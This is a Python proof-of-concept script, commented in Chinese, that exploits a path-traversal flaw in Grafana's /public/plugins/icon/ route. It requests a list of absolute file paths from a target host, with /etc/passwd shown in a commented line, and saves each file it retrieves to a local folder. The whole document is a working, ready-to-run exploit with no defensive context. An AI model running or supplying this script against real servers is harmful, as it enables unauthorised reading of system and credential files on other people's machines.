import requests
import os
import time
import re
#修改{grafana_host&port}为grafana地址和端口
'''
http://{grafana_host&port}/public/plugins/icon/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..
'''
grafana_host=''
#修改payloads为文件的绝对路径

def payloads_open(path=r'./path1.txt'):
    payloads=[]
    with open(path,'r',encoding='UTF-8') as f:
        file=f.readlines()
        start=0
        while start<len(file):
            payloads.append(file[start].strip())
            start=start+1
    return payloads

def poc(url,payloads):
    host=re.sub('http://','',url)
    host=re.sub(':3000','',host)
    newdir=host+' '+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    newdir=re.sub(' .{2}:.{2}:.{2}$','',newdir)
    localpath=os.getcwd()
    files=os.listdir(localpath)
    k=0
    tmp=[]
    while k<len(files):
        if files[k]==newdir:
            tmp.append(files[k])
        if len(tmp)==0:
            os.mkdir(localpath+'\\'+newdir)
            os.chdir(localpath+'\\'+newdir)
            break
        else:
            os.chdir(localpath+'\\'+newdir)
        k=k+1
    print(os.getcwd())
    i=0
    while i<len(payloads):
        furl=url+r'/public/plugins/icon/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..'+payloads[i]
        #furl=url+r'/public/plugins/icon/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..'+r'/etc/passwd'
        res=requests.get(furl)
        resultname=re.sub('/','$',payloads[i])
        resultname=resultname+'.txt'
        if len(res.text)!=0:
            with open(resultname,'w',encoding='UTF-8') as f:
                f.write(res.text)
                f.close()
        i=i+1
#payloads_open()
poc(grafana_host,payloads=payloads_open())
